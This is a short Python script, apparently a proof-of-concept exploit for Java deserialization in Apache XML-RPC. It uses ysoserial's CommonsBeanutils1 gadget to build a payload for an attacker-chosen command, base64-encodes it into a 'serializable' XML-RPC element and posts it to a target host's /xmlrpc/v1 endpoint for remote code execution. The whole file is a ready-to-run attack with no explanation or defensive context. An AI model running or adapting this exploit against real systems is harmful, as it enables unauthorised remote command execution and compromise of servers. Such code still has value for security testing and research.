import requests, os, subprocess, base64

host = os.sys.argv[1]
yso = os.sys.argv[2]
cmd = os.sys.argv[3]

payload = base64.b64encode(subprocess.check_output(["java","-jar",yso,"CommonsBeanutils1",cmd])).decode('latin1')

post="""<?xml version='1.0'?>
<methodCall>
	<methodName>Pwn</methodName>
	<params>
		<param>
			<value>
				<struct>
					<member>
						<name>test</name>
						<value>
							<serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>{}</serializable>
						</value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
""".format(payload)

r = requests.post(host+"/xmlrpc/v1",data=post,headers={"Content-Type":"application/xml"})
print(r.text)